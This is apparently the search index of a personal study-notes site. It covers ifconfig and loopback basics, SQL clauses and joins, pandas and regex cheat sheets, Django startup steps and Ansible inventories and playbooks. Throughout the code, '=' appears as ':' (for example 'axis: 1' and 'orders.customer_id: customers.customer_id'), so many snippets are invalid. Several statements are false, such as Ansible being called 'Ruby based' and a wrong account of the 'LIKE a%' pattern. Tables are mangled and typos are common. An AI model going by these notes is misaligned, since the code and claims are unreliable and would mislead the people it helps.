addr</code>.</p> <p>[!tip] </p> <ul> <li>Enables you to connect and manipulate     LAN</li> <li>You can easily switch your IP with:<ul> <li><code>sudo ifconfig eth0 new_ip</code></li> <li>You can also change the subnet     mask     and broadcast</li> <li>Example of IP spoofing: &gt; [!example] &gt;     <code>kali &gt; ifconfig eth0 192.168.181.115 netmask 255.255.0.0 broadcast 192.168.1.255</code></li> </ul> </li> </ul>"},{"location":"docs/Penetration/ifconfig/#useful-flags","title":"Useful Flags","text":"<ul> <li>Down<ul> <li>Marks an interface as not working (down), which prevents the     system from trying to transmit messages through that interface.<ul> <li>If possible, the <code>ifconfig</code> command also resets the     interface to disable reception of messages.</li> <li>Routes that use the interface, however, are not     automatically disabled.</li> </ul> </li> </ul> </li> </ul> <p>iwconfig Spoofing</p>"},{"location":"docs/Penetration/iwconfig/","title":"iwconfig","text":""},{"location":"docs/Penetration/iwconfig/#iwconfig","title":"Iwconfig","text":"<p>Ipconfig for Wi-Fi</p> <p>[!quote] ifconfig</p>"},{"location":"docs/Penetration/lo/","title":"lo","text":""},{"location":"docs/Penetration/lo/#loopback-address","title":"Loopback address","text":""},{"location":"docs/Penetration/lo/#alt-name-local-host-this-is-a-special-software-address-that-connects","title":"alt-name Local Host This is a special software address that connects","text":"<p>you to your own system. Software and services not running on your system can\u2019t use it. You would use lo to test something on your system, such as your own web server.</p> <p>The localhost is generally represented with the IP address 127.0.0.1 - An easy way to self refence is to ping 127.0.0.1</p> <p>[!quote] defult gateway ; subnet mask ; DNS</p>"},{"location":"docs/Rust/Rust_Projects/","title":"Rust Projects","text":""},{"location":"docs/Rust/Rust_Projects/#convert-celcius-to-fareneit","title":"Convert Celcius to Fareneit","text":""},{"location":"docs/Rust/Rust_Projects/#guessing-game","title":"Guessing Game","text":"<p>[!quote]</p>"},{"location":"docs/SQL/Aggregates/","title":"Aggregates","text":"<p>Calculation performed on multiple rows</p>"},{"location":"docs/SQL/Baisic_structure_of_a_SQL/","title":"Baisic structure of a SQL","text":"<ol> <li> <p>FROM the appropriate table</p> </li> <li> <p>SELECT {Chose column(s) you     want}</p> </li> <li> <p>WHERE - a certain condition is     met</p> </li> </ol> <p>This is suggested order in which you wrote your SQL queries .</p> <p>Start big(data table ) and go small (specyfic codition )</p> <p> Queries</p> <p>Select * from employees where employees: male ;</p> <p>Statement  Text recognized as command</p> <p>Statements always and with semicolons ; <code>CREATE TABLE table_name (   \u00a0\u00a0\u00a0column_1 data_type,   \u00a0\u00a0\u00a0column_2 data_type,   \u00a0\u00a0\u00a0column_3 data_type   );</code></p> <p>Sql statement</p> Clause (eg.<code>CREATE TABLE</code>) Clauses can also be referred as commands Clauses are written in capital letters  <ol> <li><code>table_name</code>\u00a0refers to the name of the table that the command is     applied to.</li> <li><code>(column_1 data_type, column_2 data_type, column_3 data_type)</code>\u00a0is     a\u00a0parameter. Paramiter</li> </ol> <p>**list of columns, data types, or values that are passed to a clause as an argument. Here, the parameter is a list of column names and the associated data type.</p> <p>Create creates table from the scratch</p> <p><code>CREATE TABLE celebs (   \u00a0\u00a0\u00a0id INTEGER,   \u00a0\u00a0\u00a0name TEXT,   \u00a0\u00a0\u00a0age INTEGER   );</code></p> <p>Use it directors u to a practical database</p> <p>Drop Deletes the database</p> <p>Insert </p> <p>inserts a new row into the statement</p> <p>**insert into clause that adds the specified row or rows **</p> <p>Values  Clause that indicates the data being inserted</p> <p>*INSERT INTO celebs (id, name, age) VALUES (1, \u2018Justin Bieber\u2019, 22);`</p> <p>Alert table  ads a new colummne to a table ALTER TABLE celebs</p> <p>Constrains As Keyword that allows u to rename a column or table</p> <p>Select distinct</p> <p>SQLoperatrors It only select distinct values such as</p> <p>select distinct e_gender from employee</p> <p>Text is an indicator of data type</p> <p>Null  Specials value that represents missing or unknown data</p> <p>Update edits a row in a table <code>PDATE celebs</code> <code>SET twitter_handle</code> `<code>=\u00a0'@taylorswift13'</code>` `WHERE id =\u00a04;Delete from </p> <p>clause that lets u delete the table</p> <p>Is null </p> <p>A condition that returns true when the value is null (false )</p> <p>Eg. `DELETE\u00a0FROM\u00a0celebs\u00a0</p> <p>WHERE\u00a0twitter_handle\u00a0IS\u00a0NULL;</p> <p>SELECT\u00a0*\u00a0FROM\u00a0celebs;`</p>"},{"location":"docs/SQL/Calculation_SQL/","title":"Calculation SQL","text":"<p>Aggragates</p> <p>Baisic aggragetes COUNT(): count the number of rows</p> <p>SUM(): the sum of the values in a column</p> <p>MAX()/MIN(): the largest/smallest value</p> <p>AVG(): the average of the values in a column</p> <ul> <li> <p>ROUND(): round the values in the     column</p> <ul> <li>ROUND\u00a0function     takes two arguments inside the parenthesis:</li> </ul> </li> <li> <p>a column name</p> </li> <li>an integer</li> </ul> <p>It rounds the values in the column to the number of decimal places specified by the integer.</p>"},{"location":"docs/SQL/Case/","title":"Case","text":"<pre><code>**A CASE statement allows us to create different outputs**\n</code></pre> <p>(usually in the SELECT statement).  </p> <p>It is SQL\u2019s way of handling if-then logic Suppose we want to condense the ratings in movies to three levels:</p> <pre><code>If the rating is above 8, then it is Fantastic.\nIf the rating is above 6, then it is Poorly Received.\nElse, Avoid at All Costs.\nSELECT name,\n CASE\n  WHEN imdb_rating &gt; 8 THEN 'Fantastic'\n  WHEN imdb_rating &gt; 6 THEN 'Poorly Received'\n  ELSE 'Avoid at All Costs'\n END\nFROM movies;\n</code></pre> <p>Each WHEN tests a condition and the following THEN gives us the string if the condition is true. The ELSE gives us the string if all the above conditions are false. The CASE statement must end with END. In the result, you have to scroll right because the column name is very long. To shorten it, we can rename the column to \u2018Review\u2019 using AS:</p> <pre><code>SELECT name,\n CASE\n  WHEN imdb_rating &gt; 8 THEN 'Fantastic'\n  WHEN imdb_rating &gt; 6 THEN 'Poorly Received'\n  ELSE 'Avoid at All Costs'\n END AS 'Review'\nFROM movies;\n</code></pre>"},{"location":"docs/SQL/Distinc_SQL/","title":"Distinc SQL","text":"<pre><code>Distinct\n</code></pre> <p>When we are examining data in a table, it can be helpful to know what\u00a0distinct\u00a0values exist in a particular column.</p> <p><code>DISTINCT</code>\u00a0is used to return unique values in the output. It filters out all duplicate values in the specified column(s).</p>"},{"location":"docs/SQL/Group_by/","title":"Group by","text":"<pre><code> #clause\n</code></pre> <p>It is used in collaboration withe the select stamtemnt to arrange indetical data into groups. Used with aggreegates functions</p> <pre><code>it can be goruped by the columns name\n</code></pre> <p>The\u00a0<code>GROUP BY</code>\u00a0statement comes after any\u00a0<code>WHERE</code>\u00a0statements, but before\u00a0<code>ORDER BY</code>\u00a0or\u00a0<code>LIMIT</code>.</p> <p>When u want to limit the resatults based of a query base onvalues of the individual rows use </p>"},{"location":"docs/SQL/Having/","title":"Having","text":"<pre><code>**ltihmei the resaults of an  query based on an aggregate property.\n</code></pre> <ul> <li>When we want to limit the results of a query based on an aggregate     property, use\u00a0<code>HAVING</code>.</li> </ul>"},{"location":"docs/SQL/Is_null/","title":"Is null","text":"<p>Unknown values are indicated by\u00a0<code>NULL</code>.</p> <p>It is not possible to test for\u00a0<code>NULL</code>\u00a0values with comparison operators, such as\u00a0<code>=</code>\u00a0and\u00a0<code>!=</code>.</p> <p>Instead, we will have to use these operators:</p> <ul> <li><code>IS NULL</code></li> <li><code>IS NOT NULL</code></li> </ul> <p>To filter for all movies\u00a0with\u00a0an IMDb rating:</p> <pre><code>SELECT nameFROM movies WHERE imdb_rating IS NOT NULL;\n</code></pre>"},{"location":"docs/SQL/Like/","title":"Like","text":""},{"location":"docs/SQL/Like/#like","title":"Like","text":"<p><code>LIKE</code>\u00a0can be a useful operator when you want to compare similar values.</p> <p>The\u00a0<code>movies</code>\u00a0table contains two films with similar titles, \u2018Se7en\u2019 and \u2018Seven\u2019.</p> <p>How could we select all movies that start with \u2018Se\u2019 and end with \u2018en\u2019 and have exactly one character in the middle?</p> <pre><code>SELECT *\u00a0FROM moviesWHERE name LIKE 'Se_en';\n</code></pre> <ul> <li> <p><code>LIKE</code>\u00a0is a special operator used with the\u00a0<code>WHERE</code>\u00a0clause to search     for a specific pattern in a column.</p> </li> <li> <p><code>name LIKE 'Se_en'</code>\u00a0is a condition evaluating the\u00a0<code>name</code>\u00a0column for     a specific pattern.</p> </li> <li> <p><code>Se_en</code>\u00a0represents a pattern with a\u00a0wildcard\u00a0character.</p> </li> </ul> <p>The\u00a0<code>_</code>\u00a0means you can substitute any individual character here without breaking the pattern. The names\u00a0<code>Seven</code>\u00a0and\u00a0<code>Se7en</code>\u00a0both match this pattern.</p>"},{"location":"docs/SQL/Like/#like-2","title":"Like 2","text":"<p>Like II The percentage sign % is another wildcard character that can be used with LIKE.</p> <p>This statement below filters the result set to only include movies with names that begin with the letter \u2018A\u2019:</p> <p>SELECT * FROM movies WHERE name LIKE \u2018A%\u2019; % is a wildcard character that matches zero or more missing letters in the pattern. For example:</p> <p>A% matches all movies with names that begin with letter \u2018A\u2019 %a matches all movies that end with \u2018a\u2019 We can also use % both before and after a pattern:</p> <p>SELECT * FROM movies WHERE name LIKE \u2018%man%\u2019; Here, any movie that contains the word \u2018man\u2019 in its name will be returned in the result.</p> <p>LIKE is not case sensitive. \u2018Batman\u2019 and \u2018Man of Steel\u2019 will both appear in the result of the query above.</p> <p>Different use cases of the LIKE operator</p> <p>LIKE c% finds any values that start with the letter \u2018c\u2019 LIKE %c finds any values that end with the letter \u2018c\u2019 LIKE %re% finds values that have \u2018re\u2019 in any position LIKE a% finds any values that have the letter \u2018a\u2019 in the second index LIKE a%_% finds any values that start with \u2018a\u2019 and are at least 3 characters in length. LIKE a%r finds any values that start with \u2018a\u2019 and end with \u2018r\u2019.</p>"},{"location":"docs/SQL/Order_by/","title":"Order by","text":"<p>Sort the resaults using to lis the data our result set in particular order</p> <ul> <li>it can be goruped by the columns name</li> </ul> <p>order by desc sorts data in descending order</p> <p>ASC sorts results in ascending order</p> <p>Note: ORDER BY always goes after WHERE (if WHERE is present</p>"},{"location":"docs/SQL/cross_join.sql/","title":"cross join.sql","text":"<pre><code>&lt;mark class=\"hltr-pomarancza\"&gt;We use it  compere  all rows from one table to the other &lt;/mark&gt;\n</code></pre> <p>Select from cross join ;</p> <p>join.sql</p>"},{"location":"docs/SQL/join.sql/","title":"join.sql","text":"<pre><code>**Used for combaibning tables**\n</code></pre> <p>Formula</p> <pre><code>select *\n from orders \njoin customers\n ON orders.customer_id: customers.customer_id;\n</code></pre> <p>others cross join.sql</p>"},{"location":"docs/SQL/left_join.sql/","title":"left join.sql","text":"<pre><code>SQL lets us do this through a command called\u00a0[`LEFT JOIN`](https://www.codecademy.com/resources/docs/sql/commands/left-join?page_ref: catalog). A\u00a0_left join_\u00a0will keep all rows from the first table, regardless of whether there is a matching row in the second table.\n</code></pre> <p>[!example] SELECT * FROM table1 LEFT JOIN table2 \u00a0\u00a0ON table1.c2 =\u00a0table2.c2;</p>"},{"location":"docs/SQL/limit/","title":"limit","text":"<pre><code>We\u2019ve been working with a fairly small table (fewer than 250 rows), but most SQL tables contain hundreds of thousands of records. In those situations, it becomes important to cap the number of rows in the result.\n</code></pre> <p>For instance, imagine that we just want to see a few examples of records.</p>"},{"location":"docs/SQL/union.sql/","title":"union.sql","text":"<pre><code>&lt;mark class=\"hltr-pomarancza\"&gt;Stack one databaes on the other&lt;/mark&gt;\n</code></pre> <p>[!example] SELECT * FROM table1 UNION SELECT * FROM table2;</p> <p>Restrictions</p> <ul> <li> <p>Tables must have the same number of     columnds</p> </li> <li> <p>The columns ust have the same     [[data type.py]]  in the same order as     the first table</p> </li> </ul>"},{"location":"docs/SQL/with.sql/","title":"with.sql","text":"<p>This statment allows us to perform a separate query (such as aggregating customer\u2019s subscriptions)</p> <p>We are putting a whole first query inside the parentheses\u00a0<code>()</code>\u00a0and giving it a name. After that, we can use this name as if it\u2019s a table and write a new query\u00a0using\u00a0the first query.</p> <p>**SELECT customer_id, \u00a0\u00a0\u00a0COUNT(subscription_id) AS \u2018subscriptions\u2019 FROM orders GROUP BY customer_id; WITH previous_results AS ( \u00a0\u00a0\u00a0SELECT \u2026 \u00a0\u00a0\u00a0\u2026 \u00a0\u00a0\u00a0\u2026 \u00a0\u00a0\u00a0\u2026 ) SELECT * FROM previous_results JOIN customers \u00a0\u00a0ON _____ =\u00a0_____; WITH\u00a0previous_query\u00a0AS\u00a0(</p> <p>SELECT\u00a0customer_id,</p> <p>COUNT(subscription_id)\u00a0AS\u00a0\u2018subscriptions\u2019</p> <p>FROM\u00a0orders</p> <p>GROUP\u00a0BY\u00a0customer_id</p>"},{"location":"docs/SQL/to_revise/Default/","title":"Default","text":"<pre><code>&lt;mark class=\"hltr-grses\"&gt;Sets a default value for a column  when no value is spiced&lt;/mark&gt;\n</code></pre>"},{"location":"docs/SQL/to_revise/Not_Null/","title":"Not Null","text":"<pre><code>&lt;mark class=\"hltr-dsadsadasdas\"&gt;Ensures that a column cannot have a NULL value &lt;/mark&gt;\n</code></pre>"},{"location":"docs/SQL/to_revise/SQL_Data_types/","title":"SQL Data types","text":"<pre><code>![numerc_data_SQL_visual.png](../../../static/numerc_data_SQL_visual.png)\n</code></pre>"},{"location":"docs/SQL/to_revise/SQL_functions/","title":"SQL functions","text":"<pre><code>**Min function**\n</code></pre> <p>gives the smallest value in the column</p> <p> MAx fucyion Gives u the largest value  Count returns the number of rows that match a specific criteria  Sum gives the total sum of numeri column </p> <p>AVG gives the avrage value of a numeric column) </p>"},{"location":"docs/SQL/to_revise/SQLoperatrors/","title":"SQLoperatrors","text":"<pre><code>&lt;mark class=\"hltr-try\"&gt;**AND** &lt;/mark&gt;\n</code></pre> <p>It displaces multiple condition similarly to python if both conditions are true OR If one condition is satisficed then it shows the data</p> <p>Instead of combining multiple commands we can use in function to connect strings</p> <p>Instead *Select * From customers Where state: \u201cva\u201d or state = \u2018ga\u2019 etc . * use where state in (\u2018va,cl,dc,etc.\u2019)</p> <p>NOT It displays a record if the condition is not true</p> Like  extracts record where particular pattern is present Wild card characters  % represents zero , one or multiple characters  _ Represents a single character  <p>Between operators Select values within a given range </p>"},{"location":"docs/SQL/to_revise/Unique/","title":"Unique","text":"<pre><code>&lt;mark class=\"hltr-grses\"&gt;Ensures that all the values in the column  are different &lt;/mark&gt;\n</code></pre>"},{"location":"docs/SQL/to_revise/foregin_key.sql/","title":"foregin key.sql","text":"<p>Whe the primary key for one table appears in the other</p> <p>Why is it important ? The most common types of joins will be joining a foreign key from one table with the primary key from another table. For instance, when we join orders and customers, we join on customer_id, which is a foreign key in orders and the primary key in customers.</p>"},{"location":"docs/SQL/to_revise/primary_key/","title":"primary key","text":"<pre><code>&lt;mark class=\"hltr-grses\"&gt;Uniquely identifies each record in a table&lt;/mark&gt;\n</code></pre> <p>(Not Null+Unique)</p> <p>oppostie foregin key.sql</p>"},{"location":"docs/ZPythonref/MAIN_Python/","title":"regex","text":""},{"location":"docs/ZPythonref/MAIN_Python/#python-baisick-function","title":"Python Baisick Function","text":"<p> # Data Functions</p> <p></p>"},{"location":"docs/ZPythonref/data_py/","title":"data py","text":"<pre><code>| *Function*                | Key                                          | Mode    |\n</code></pre> <p>\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014- | \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2013 | \u2014\u2014- | convert rows to numeric | df.apply (pd.to_numeric,errors: \u201ccoerce\u201d) | Pandas | get rid of symbols | .apply(lambda x: x.str.replace(\u2018%\u2019, \u2019\u2019)) | Pandas | get rid of spaces | df.columns.str.replace(\u2019\u2018,\u2019\u2019) | Pandas | drop columns | df.drop([\u2018Opening date\u2019], axis: 1) | Panadas | mean | np.mean(ndf[\u201cWin%\u201d]) | Numpy</p> <p>[!quote] regex | pandas_py</p>"},{"location":"docs/ZPythonref/pandas_py/","title":"Functions","text":"Task Code Read file <code>pd.read_csv(path)</code> Set maximum rows displayed in the terminal <code>pd.options.display.max_rows: number</code> Recognize headers <code>print(df.columns)</code> Display particular headers <code>print(df[['Categories']])</code> Sort values alphabetically <code>df.sort_values(['Search Volume'], ascending: True).head(100)</code>Use <code>ascending=False</code> for descending values Values in particular condition <code>print(df.loc[(df['Intents'] == 't')                                                                                             | | Drop column                                                |</code>df.drop(df.columns[[1, 2, 3, 4]], axis: 1)<code>| | Insert a new column                                        |</code>df[\u2018new category\u2019] = df.iloc[:, range].sum(axis: 1)<code>| | Rearrange headers                                          |</code>list(df.columns.values)<code>| | Save as CSV                                                |</code>df.to_csv(\u2018path\u2019, index: False)<code>&lt;br&gt;Use</code>sep<code>parameter for a different separator                                                | | Save as XLS                                                |</code>df.to_excel(\u2018path\u2019, index: False)<code>| | Mean                                                       |</code>df[\u2018category\u2019].mean()<code>| | Trimmed mean                                               |</code>trim_mean(df[\u2018category\u2019], drop_percentage)<code>&lt;br&gt;Drop percentage of values from top and bottom                                    | | Median                                                     |</code>df[\u2018category\u2019].median()<code>| | Standard deviation                                         |</code>df[\u2018category\u2019].std()<code>| | Check duplicated values                                    |</code>df.loc[df.duplicated()]<code>&lt;br&gt;Use</code>subset=[name_of_the_column]<code>to check a specific column                                        | | Duplicated values                                          |</code>df.duplicated()<code>&lt;br&gt;The output is a boolean Series. Use</code>df.duplicated(subset=[name_of_the_column])<code>to check a specific column | | Count of NaN values                                        |</code>df.isna().sum()<code>| | Rename columns                                             |</code>df.rename(columns={\u2018previous_column\u2019: \u2018new_column\u2019})<code>| | Count of each unique value in a column                     |</code>df[\u2018MAIN_GENRE\u2019].value_counts()<code>| | Concatenate two data frames (append)                       |</code>pd.concat([df, df_to_append])<code>| | Convert to numeric (float or int)                          |</code>pd.to_numeric(df[\u2018numeric category\u2019])<code>| | Convert to datetime format                                 |</code>pd.to_datetime(df[\u2018publishTime\u2019])<code>| | Casting data types                                         |</code>df[\u2018column\u2019].astype(\u2018data_type\u2019)<code>| | Filter out rows with no values                             |</code>df.loc[\\~df[\u2018likeCount\u2019].isna()]<code>| | Check for NaN values                                       |</code>df.isna()<code>&lt;br&gt;It returns a boolean DataFrame. Use</code>\\~<code>before the expression to get the positive values                          | | Subset rows based on condition                             |</code>df.loc[df[\u2018RELEASE_YEAR\u2019] &gt; 1999]<code>&lt;br&gt;You can also use the</code>query<code>method                                                       | | Subset columns                                             |</code>df[[\u2018column1\u2019, \u2018column2\u2019]]<code>| | Shape of the DataFrame                                     |</code>df.shape<code>| | Basic information                                          |</code>df.describe()<code>| | Set the index                                              |</code>df.set_index(\u2018column_name\u2019)<code>| | Locate based on index                                      |</code>df.loc[index_value]<code>| | Data types                                                 |</code>df.dtypes`Remember not to use parentheses Get the only the values of the column in a list of lisit df[\u2019\u2019[\u2018Title\u2019]].values.tolist() <p>[!quote] regex data_py firebase</p>"},{"location":"docs/ZPythonref/python_functions/","title":"python functions","text":"<pre><code>| *function*                              | **Key**                             | Mode                                                                                                                |\n</code></pre> <p>\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014 | \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2013 | \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014- | absolute value | abs() | to convert a list of negatives values into postive one | enumerate(index) | for i ,j in enumerate ([list]) | applaied an counmt to a listin a form of tuple or with dict u get dictionary /if u pass j u break the tuple | globa list | global() | get u info about what variebles and so on u can acess within global scope | local list | local() | get u an info about the locala vartiables avaiable to u | weather all arguments are true | all() | if the list is empty it returns true it does not work on just ints | if anyirratable is true | any() | if the list is empty it returns false | checlk the type of multple datat | isinstance() | check eather the type of data is same as inputed | check weathert the thing is calllable | calllable() | Functions Classes Methods and Instances are callable | filter values * | filter(function , iterable) | if the first argument eaual: to none it will get rid of zeros alot of the times used with lambda function* |</p> <p>[!quote] Functions</p>"},{"location":"docs/ZPythonref/regex/","title":"regex","text":""},{"location":"docs/ZPythonref/regex/#main-functions","title":"Main functions \u2019\u2019","text":"function usage pattern: re.compile(r\u201dpattern\u201d) create a pattern re.finditer(pattern, string) more benefita finding pattern(since it does not store the value in memory) match.grroup *returns a string from a mathc methog *"},{"location":"docs/ZPythonref/regex/#meata-characters","title":"Meata characters","text":"Charatcer usage . Any character (exept new line characters ) ^ The line starts with exaple ^\u201chello\u201d $ The line ends with \u201cworld $ ** * ** zero or more occueances \u201caix + one or more occurance \u201caix\u201d+ {} Exacly the specyfied number of occurrences \u201cal{2}\u201d [] A set of characters \u201c[a-m]\u201d ** \u00a0** *Special sequence (or escape special characters ) pipe Either or \u201cfalls pipe stays\u201d () Capture the group <ul> <li>[^a-d] Netgeted character set</li> <li>{3,} THis should be used atleast tree times</li> <li>Parentheses (?: ): Non-capturing Grouping</li> </ul>"},{"location":"docs/ZPythonref/regex/#lookarounds","title":"Lookarounds","text":"<p>If we want the phrase we\u2019re writing to come before or after another phrase, we need to \u201clookaround\u201d. Take the next step to learn how to \u201clookaround\u201d.</p>"},{"location":"docs/ZPythonref/regex/#positive-lookahead","title":"Positive Lookahead: (?=)","text":"<p>For example, we want to select the hour value in the text. Therefore, to select only the numerical values that have PM after them, we need to write the positive look-ahead expression (?=) after our expression. Include PM after the: sign inside the parentheses.</p> <pre><code># This selects only 3 \n\\d+(?=PM)\nDate: 4 Aug *3*PM\n</code></pre>"},{"location":"docs/ZPythonref/regex/#negative-lookahead","title":"Negative Lookahead: (?!)","text":"<p>For example, we want to select numbers other than the hour value in the text. Therefore, we need to write the negative look-ahead (?!) expression after our expression to select only the numerical values that do not have PM after them. Include PM after the ! sign inside the parenthese</p> <pre><code># This selects only 4\n\\d+(?!PM)\nDate: 4 Aug 3PM\n</code></pre>"},{"location":"docs/ZPythonref/regex/#positive-lookbehind","title":"Positive Lookbehind: (?\\&lt;=)","text":"<p>r example, we want to select the price value in the text. Therefore, to select only the number values that are preceded by $, we need to write the positive lookbehind expression (?\\&lt;=) before our expression. Add $ after the: sign inside the parenthesis.</p> <pre><code># This selects only 5$\n(?&lt;=\\$)\\d+\nProduct Code: 1064 Price: $5\n</code></pre>"},{"location":"docs/ZPythonref/regex/#groups","title":"Groups","text":"<p>U can set matches into particular gorups</p> <p> In order to replace the hole group u have to use sub with /number_of_group </p>"},{"location":"docs/ZPythonref/regex/#modification","title":"Modification","text":"<ul> <li>re.split<ul> <li>splits thes trings inot a list and slpts were the regular     expresion matches</li> <li></li> </ul> </li> <li>re.sub<ul> <li>repalce were the reguolar expresion marches</li> </ul> </li> </ul>"},{"location":"docs/ZPythonref/regex/#compilation-flags","title":"Compilation flags","text":"<p>In order to add this as compialation method re.complie(pattern,re.IGNORECASE) </p>"},{"location":"docs/ZPythonref/regex/#regex-classses","title":"Regex classses","text":"Character Class Description Equivalent in C Locale &amp; ASCII <code>[:alnum:]</code> Alphanumeric characters (letters and digits) <code>[0-9A-Za-z]</code> <code>[:alpha:]</code> Alphabetic characters <code>[A-Za-z]</code> <code>[:blank:]</code> Blank characters (space and tab) N/A <code>[:cntrl:]</code> Control characters, non-printable characters N/A <code>[:digit:]</code> Digits <code>[0-9]</code> <code>[:graph:]</code> Graphic characters (excluding space) N/A <code>[:lower:]</code> Lowercase alphabetic characters <code>[a-z]</code> <code>[:print:]</code> Printable characters (including space) N/A <code>[:punct:]</code> Punctuation characters N/A <code>[:space:]</code> Whitespace characters (e.g., space, tab, newline) N/A <code>[:upper:]</code> Uppercase alphabetic characters <code>[A-Z]</code> <code>[:xdigit:]</code> Hexadecimal digits <code>[0-9A-Fa-f]</code>"},{"location":"docs/ZPythonref/regex/#usage-example","title":"Usage Example","text":"<p>To use these character classes in a regular expression, include them inside brackets:</p> <pre><code>grep '[[:digit:]]' file.txt  # Finds lines in file.txt containing any digits\n</code></pre> <p>[!quote] pandas_py | match_py | awk_command</p>"},{"location":"docs/ZPythonref/DjangoFramework/DjangoStartup/","title":"DjangoStartup","text":""},{"location":"docs/ZPythonref/DjangoFramework/DjangoStartup/#startup","title":"Startup","text":"<ul> <li> <p>django-admin list all of the commands</p> </li> <li> <p>Start project django startproject name</p> </li> <li>Run Developer server<ul> <li>python manage.py runserver</li> </ul> </li> <li> <p>Application</p> <ul> <li>Django splits the functionalites into apps</li> <li>The apps can be installed with<ul> <li>manage start app name</li> <li>This inisializes the app but it     has to be conneted to the     project</li> <li>to do it u have to in settings.py specyfie the hole     path to app.py<ul> <li>Example</li> </ul> </li> <li>In Vievs there will be all of the fucntions that get     triggerd when user visit a certian url</li> <li>in models u can configure the databse ## Urls U dont     have to store all of the urls right in main urls.py     instead u can create your own urls.py in app directoy</li> </ul> </li> </ul> </li> <li> <p>Add urls dierctory to main urls</p> </li> </ul>"},{"location":"docs/ZPythonref/DjangoFramework/DjangoStartup/#dynamics-urls","title":"Dynamics URls","text":"<p>In order to achive this feture u have to add &gt;type:var\\&lt; to url - U have to pass type of varaible (str int etc) and name</p>"},{"location":"docs/ZPythonref/DjangoFramework/DjangoStartup/#tepaltes","title":"Tepaltes","text":"<p>In order to add tempalte similalry to Flask MAIN u have to create a tempaltes folder in main dir and render them - /sideNote/ - if u want tmepletes specyficly for ure app u have to create dir app in ure app dir and another with ure app name - Example \u201ctemplates/base\u201d - And pass it like render base/templateName - Connect it to the settings.py ### Tempaltes Syntax Again its preety mutch the same as in Flask - Extend Temapaltes - Inserting content - Template Docs ## Databes Django prepars a list of command tha needs to be activated (migrated) To the sqlite3 Database There are premade tables - Command is mange migrate</p> <p>[!quote] MAIN_Python</p>"},{"location":"docs/ansible/Ansible/","title":"Architecture","text":"<p>Push model - Ruby based - demon less *   Procedural *   it creates top to bottom</p>","tags":["ansible"]},{"location":"docs/ansible/Ansible/#inventory","title":"Inventory","text":"<ul> <li>U can use pass the arguments direcly to the ivnentory</li> </ul> <pre><code>[test_server]\ncontrol_test type: client\nnode_test type: server\n</code></pre> <ul> <li> <p>The beterr approach is to use the <code>ansible_hostname</code> ( since it first performs <code>uname -n</code>)</p> </li> <li> <p>If u want to execute one host at a time use the <code>serial</code> varaible</p> </li> <li> <p>To use the host group for the playbook use <code>inventory_hostname</code></p> </li> </ul> <pre><code>  hosts: home_machines\n  vars:\n    user_home: \"/home/{{ inventory_hostname }}\"\n</code></pre>","tags":["ansible"]},{"location":"docs/ansible/Ansible/#diffrences","title":"Diffrences","text":"<p>Docs</p> <p></p> <p>Example:</p> <pre><code># to show use ansible-invetory --graph or --list in json output \n[webserver]\nservera\nservec\n[dbservers]\nservdb\n##Nested groups \n[Nested:children]\nwebserver\ndbservers\n</code></pre>","tags":["ansible"]},{"location":"docs/ansible/Ansible/#dynamic-inventories","title":"Dynamic inventories","text":"<p>Remember to define dynamic groups as empty in the static inventory file elswere the ansible will error</p> <ul> <li> <p>Dynamic inventory in     go</p> </li> <li> <p>Using a dynamic libvirt inventory with     Ansible</p> </li> </ul>","tags":["ansible"]},{"location":"docs/ansible/Ansible/#ansible-main","title":"Ansible MAIN","text":"","tags":["ansible"]},{"location":"docs/ansible/Ansible/#ansiblecfg","title":"Ansible.cfg","text":"","tags":["ansible"]},{"location":"docs/ansible/Ansible/#ansible-vault","title":"Ansible vault","text":"","tags":["ansible"]},{"location":"docs/ansible/Ansible/#ansible-playbook","title":"Ansible playbook","text":"","tags":["ansible"]},{"location":"docs/ansible/Ansible/#refrences","title":"Refrences","text":"<p>ansible-navigator</p> <p>Ansible commands</p> <p>teraform</p> <p>Puppet</p>","tags":["ansible"]},{"location":"docs/ansible/ansible-galaxy/","title":"Ansible galaxy","text":"<p>title: \"ansible-galaxy\" date: 2025-03-12T12:24:58+01:00 draft: false tags:   - ansible  w</p>"},{"location":"docs/ansible/ansible-galaxy/#plugins","title":"Plugins","text":"<p>Uses ansiable-galaxy They provied modules like for example to work with Libvirt</p>"},{"location":"docs/ansible/ansible-galaxy/#packagescollections","title":"Packages/Collections","text":"<p>U can use a bulti in .package module to install different packages</p> <p>Example</p>"},{"location":"docs/ansible/ansible-navigator/","title":"Generate a sample config","text":"<p>Don't pipe it direcly because it gets parsed imidiatly xdddd  and it's empty</p> <p>Use pull policy to be missing and also rember to delte  # + space to uncoment <pre><code>ansible-navigator settings  --gs  --pp never &gt; tmp; mv tmp ansible-navigator.yml\n</code></pre></p> <p>f to fileter <code>--eei</code> overites the imgae for the collections </p> <p>So  baicly the env is run in a rootles podman container  in the root namescapec of the containeare  therefore the exeuctei is stating that the playbook is run as root instaed of  run as  anorma user </p>"},{"location":"docs/ansible/ansible-navigator/#collection-should-be-in-collection-folder-that-then-binds-it-to-the-container-volume","title":"Collection should be in /collection folder  that then binds it to the container volume","text":""},{"location":"docs/ansible/ansible-navigator/#host_vars-group_vars","title":"host_vars group_vars","text":""},{"location":"docs/ansible/ansible-playbook/","title":"ansible-playbook","text":"","tags":["ansible"]},{"location":"docs/ansible/ansible-playbook/#facts-and-conditionals","title":"Facts and conditionals","text":"<p>Docs</p>","tags":["ansible"]},{"location":"docs/ansible/ansible-playbook/#gathering-info","title":"Gathering info","text":"<p>Gathering facts may be costly \u2013 use setup for specific machines you want to check. * If gather_facts is enabled, we can use it to verify system facts   * And set the task blocks accordingly * Use when for conditionals * Or variables with the assert module</p> <p>Docs</p> <pre><code># Example Gathering info\ngather_facts: true\ntask:\n    - name: Veryfie that this si the debian dirsto\n      when: \"'Debian' is ansiable_fact['distribiution']\"\n      block:\n        - name: This is Debian\n        - ansible.builtin.debug:\n                - msg: This is Debian\n</code></pre>","tags":["ansible"]},{"location":"docs/ansible/ansible-playbook/#user-defined-facts","title":"User defined facts","text":"<ul> <li>Create 